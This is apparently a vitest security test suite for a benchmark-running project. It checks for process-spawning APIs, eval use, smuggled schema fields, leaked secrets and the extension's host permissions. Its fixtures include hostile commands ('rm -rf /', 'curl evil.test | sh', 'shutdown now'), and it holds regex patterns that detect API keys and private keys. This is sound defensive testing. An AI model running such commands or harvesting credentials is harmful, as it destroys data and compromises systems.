import { describe, expect, it } from 'vitest';
import { readFile, readdir, stat } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { BenchmarkSchema, WorkflowTraceSchema } from '@rigorrun/core';
import { buildDemoPipeline } from '@rigorrun/runner';

const repoRoot = resolve(import.meta.dirname, '..', '..', '..');

async function sourceFiles(dir: string): Promise<string[]> {
  const out: string[] = [];
  for (const entry of await readdir(dir, { withFileTypes: true })) {
    if (entry.name === 'node_modules' || entry.name === 'dist' || entry.name.startsWith('.')) continue;
    const full = join(dir, entry.name);
    if (entry.isDirectory()) out.push(...(await sourceFiles(full)));
    else if (/\.(ts|tsx|mjs)$/.test(entry.name)) out.push(full);
  }
  return out;
}

describe('an imported benchmark cannot cause command execution', () => {
  const EXECUTION_PATH = [
    'packages/core/src',
    'packages/northstar/src',
    'packages/verifier/src',
    'packages/generator/src',
    'packages/compiler/src',
    'packages/scoring/src',
    'packages/agents/src',
    'packages/runner/src',
    'packages/report/src',
  ];

  it('never imports a process-spawning API anywhere in the execution path', async () => {
    const offenders: string[] = [];
    for (const dir of EXECUTION_PATH) {
      for (const file of await sourceFiles(join(repoRoot, dir))) {
        const source = await readFile(file, 'utf8');
        if (/from ['"]node:child_process['"]|require\(['"]child_process['"]\)|\bexecSync\b|\bspawnSync\b/.test(source)) {
          offenders.push(file);
        }
      }
    }
    expect(offenders).toEqual([]);
  });

  it('never evaluates code from data', async () => {
    const offenders: string[] = [];
    for (const dir of EXECUTION_PATH) {
      for (const file of await sourceFiles(join(repoRoot, dir))) {
        const source = await readFile(file, 'utf8');
        // `new Function` and `eval` would let a crafted artefact run code.
        if (/\beval\(|new Function\(/.test(source)) offenders.push(file);
      }
    }
    expect(offenders).toEqual([]);
  });

  it('has no schema field in which a command or path could be smuggled', async () => {
    const { benchmark, trace } = await buildDemoPipeline();

    // Anything not in the schema is dropped rather than carried through.
    const hostile = {
      ...benchmark,
      cases: [
        {
          ...benchmark.cases[0]!,
          command: 'rm -rf /',
          exec: { shell: 'curl evil.test | sh' },
          seed: { ...benchmark.cases[0]!.seed, script: './payload.sh' },
        },
      ],
    };
    const parsed = BenchmarkSchema.parse(hostile);
    const serialised = JSON.stringify(parsed);
    expect(serialised).not.toContain('rm -rf');
    expect(serialised).not.toContain('curl evil.test');
    expect(serialised).not.toContain('payload.sh');

    const hostileTrace = WorkflowTraceSchema.parse({
      ...trace,
      command: 'shutdown now',
      events: [{ ...trace.events[0]!, exec: 'whoami' }],
    });
    expect(JSON.stringify(hostileTrace)).not.toContain('shutdown now');
    expect(JSON.stringify(hostileTrace)).not.toContain('whoami');
  });
});

describe('no secret ever reaches a shipped artefact', () => {
  const SECRET_PATTERNS: [string, RegExp][] = [
    ['OpenAI-style key', /\bsk-[A-Za-z0-9]{20,}/],
    ['Groq key', /\bgsk_[A-Za-z0-9]{20,}/],
    ['Google key', /\bAIza[0-9A-Za-z_-]{30,}/],
    ['GitHub token', /\bghp_[A-Za-z0-9]{30,}/],
    ['AWS access key id', /\bAKIA[0-9A-Z]{16}\b/],
    ['Slack token', /\bxox[baprs]-[A-Za-z0-9-]{20,}/],
    ['PEM private key', /-----BEGIN [A-Z ]*PRIVATE KEY-----/],
  ];

  it('finds none in the committed source', async () => {
    const findings: string[] = [];
    for (const dir of ['packages', 'apps', 'scripts', 'e2e', 'examples']) {
      const full = join(repoRoot, dir);
      if (!existsSync(full)) continue;
      for (const file of await sourceFiles(full)) {
        // Test files legitimately contain secret-shaped fixtures — that is how
        // the redactor is verified. Shipped source must contain none.
        if (file.includes(`${'/'}test${'/'}`)) continue;
        const source = await readFile(file, 'utf8');
        for (const [label, pattern] of SECRET_PATTERNS) {
          if (pattern.test(source)) findings.push(`${label} in ${file}`);
        }
      }
    }
    expect(findings).toEqual([]);
  });

  it('finds none in the built recorder extension', async () => {
    const dist = join(repoRoot, 'dist', 'rigorrun-extension');
    if (!existsSync(dist)) return; // built by `pnpm build:extension`

    const findings: string[] = [];
    for (const name of await readdir(dist)) {
      const path = join(dist, name);
      if ((await stat(path)).isDirectory()) continue;
      if (!/\.(js|html|css|json)$/.test(name)) continue;
      const source = await readFile(path, 'utf8');
      for (const [label, pattern] of SECRET_PATTERNS) {
        if (pattern.test(source)) findings.push(`${label} in ${name}`);
      }
    }
    expect(findings).toEqual([]);
  });

  it('ships an .env.example with no values in it', async () => {
    const example = await readFile(join(repoRoot, '.env.example'), 'utf8');
    for (const line of example.split('\n')) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      const [, value] = trimmed.split('=', 2);
      expect(value ?? '', `"${trimmed}" has a value`).toBe('');
    }
  });

  it('gitignores .env and the local artefact directory', async () => {
    const gitignore = await readFile(join(repoRoot, '.gitignore'), 'utf8');
    expect(gitignore).toMatch(/^\.env$/m);
    expect(gitignore).toMatch(/^\.rigorrun\/$/m);
  });
});

describe('the frontend never reads a provider key', () => {
  it('has no key lookup in any app source', async () => {
    const offenders: string[] = [];
    for (const app of ['apps/web/src', 'apps/demo-crm/src', 'apps/extension/src']) {
      for (const file of await sourceFiles(join(repoRoot, app))) {
        const source = await readFile(file, 'utf8');
        if (/GROQ_API_KEY|GEMINI_API_KEY|OPENAI_COMPATIBLE_API_KEY|CLOUDFLARE_API_TOKEN/.test(source)) {
          offenders.push(file);
        }
      }
    }
    expect(offenders).toEqual([]);
  });
});

describe('the recorder extension cannot reach a remote host', () => {
  it('declares only loopback host permissions', async () => {
    const manifest = JSON.parse(
      await readFile(join(repoRoot, 'apps/extension/manifest.json'), 'utf8'),
    ) as { host_permissions: string[]; permissions: string[] };

    expect(manifest.host_permissions).toEqual(['http://localhost/*', 'http://127.0.0.1/*']);
    // No `<all_urls>`, no wildcard scheme.
    expect(manifest.host_permissions.some((p) => p.includes('*://') || p === '<all_urls>')).toBe(false);
    expect(manifest.permissions).not.toContain('webRequest');
    expect(manifest.permissions).not.toContain('cookies');
  });
});
